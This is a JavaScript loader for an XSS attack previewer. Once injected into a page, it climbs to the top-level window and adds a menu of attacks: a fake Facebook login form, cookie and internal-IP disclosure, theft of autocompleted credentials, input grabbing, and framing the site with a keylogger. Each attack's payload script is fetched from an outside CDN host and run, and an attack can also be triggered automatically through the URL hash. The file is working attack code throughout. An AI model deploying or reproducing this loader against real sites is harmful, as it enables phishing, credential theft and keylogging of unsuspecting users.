/*******************************/
// Detect when body object is not available or when it is in an iframe that has access to top level parent

if (!originalWinJRXSS) {
    var originalWinJRXSS = window;
    var winObj = originalWinJRXSS;
    var docObj = winObj.document;

    if (winObj.top != winObj.self) {
        try {
            while (winObj.document && winObj != winObj.parent) {
                docObj = winObj.parent.document;
                winObj = winObj.parent;
            }
        } catch (e) { }
    }

    if (!docObj.body) {
        try {
            docObj.open();
            docObj.write("<body></body>");
            docObj.close();
        } catch (e) { }
    }

    winObj.originalWinJRXSS = originalWinJRXSS;
}
/*******************************/

var s = document.createElement("select");

s.addoption = function(t, f) {
    var o = document.createElement("option");
    o.value = f; // Add value to option
    if (typeof f === "function" || !f) 
        o.addEventListener("click", f);
    else {
        o.addEventListener("click", function(event) {
            event.preventDefault(); // Prevent default action
            event.stopPropagation(); // Stop event propagation
            console.log("Option clicked:", t); // Debugging log
            window.callback = (function(ff) {
                return function() {
                    console.log("Callback function called for:", ff); // Debugging log
                    window[ff]();
                    window.callback = function() {};
                };
            })(f);
            var script = document.createElement("script");
            script.src = "https://cdn.jsdelivr.net/gh/JacobRiggs/xss@main/attacks/" + f + ".js";
            document.body.appendChild(script);
            console.log("Script appended:", script.src);
        });
    }

    o.appendChild(document.createTextNode(t));
    this.appendChild(o);
};

// Hide tinybox and tinymask function
function hideTinyboxAndMask() {
    var tinybox = document.getElementById('tinybox');
    var tinymask = document.getElementById('tinymask');
    if (tinybox) {
        tinybox.style.display = 'none';
    }
    if (tinymask) {
        tinymask.style.display = 'none';
    }
}

// Listen for changes to the select box.
s.addEventListener("change", function(e) {
    e.preventDefault(); // Prevent default action
    e.stopPropagation(); // Stop event propagation
    console.log("Select box changed"); // Debugging log
    var selectedOption = e.target.children[e.target.selectedIndex];
    selectedOption.click();
    if (selectedOption.value === "keylogger") { // Hide the tinybox and tinymask if "keylogger" is selected
        hideTinyboxAndMask();
    }
}, true);

// Add options
s.addoption("Select attack to preview...");
s.addoption("Fake Facebook login form", "fb");
s.addoption("Reveal internal IP addresses", "internalIPs");
s.addoption("Reveal user-accessible cookies", "cookies");
s.addoption("Steal autocompleted credentials", "autocomplete");
s.addoption("Frame site and insert keylogger", "keylogger");
s.addoption("Steal input box value", "inputgrabber");

// This is written to the JR popup.
window.JRSelect = s;

// Include options.js:
var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/JacobRiggs/xss@main/options.js";
document.body.appendChild(script);

// Automatically execute an attack if desired.
if (document.currentScript) {
    var sUrl = document.currentScript.src;
    // Extract hash part.
    sUrl = sUrl.split('#');
    if (sUrl.length == 2) {
        window.sUrlArgs = sUrl[1].split('|');

        // We want to automate one of the attacks.
        var i = parseInt(sUrl[1]);
        if (i < window.JRSelect.options.length) {
            // Move selection.
            window.JRSelect.options.selectedIndex = i;
            // Trigger attack.
            window.JRSelect.options[i].click();
        }
    }
}
